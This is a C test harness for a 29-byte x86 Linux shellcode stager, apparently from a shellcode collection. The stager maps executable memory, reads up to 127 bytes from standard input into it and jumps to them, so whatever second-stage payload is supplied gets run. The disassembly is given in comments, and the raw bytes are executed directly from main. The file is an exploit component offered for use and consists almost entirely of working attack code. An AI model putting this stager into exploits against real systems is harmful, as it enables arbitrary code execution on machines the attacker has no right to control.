#include <stdio.h>
/*

load 0x7f bytes from stdin then jmp --  29 Bytes -- 8MAY2017 -- icon

0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  6a ff                   push   0xffffffff
5:  6a 22                   push   0x22
7:  6a 07                   push   0x7
9:  6a 7f                   push   0x7f
b:  50                      push   eax
c:  89 e3                   mov    ebx,esp
e:  b0 5a                   mov    al,0x5a
10: cd 80                   int    0x80
12: 91                      xchg   ecx,eax
13: 6a 03                   push   0x3
15: 58                      pop    eax
16: 5b                      pop    ebx
17: 5a                      pop    edx
18: cd 80                   int    0x80
1a: ff e1                   jmp    ecx
*/

char loader[] = \
"\x31\xC0\x50\x6A\xFF\x6A\x22\x6A\x07\x6A\x7F\x50\x89\xE3"
"\xB0\x5A\xCD\x80\x91\x6A\x03\x58\x5B\x5A\xCD\x80\xFF\xE1";


int main(int argc, char **argv){
  int (*test)() = (int(*)())loader;
  test();
}
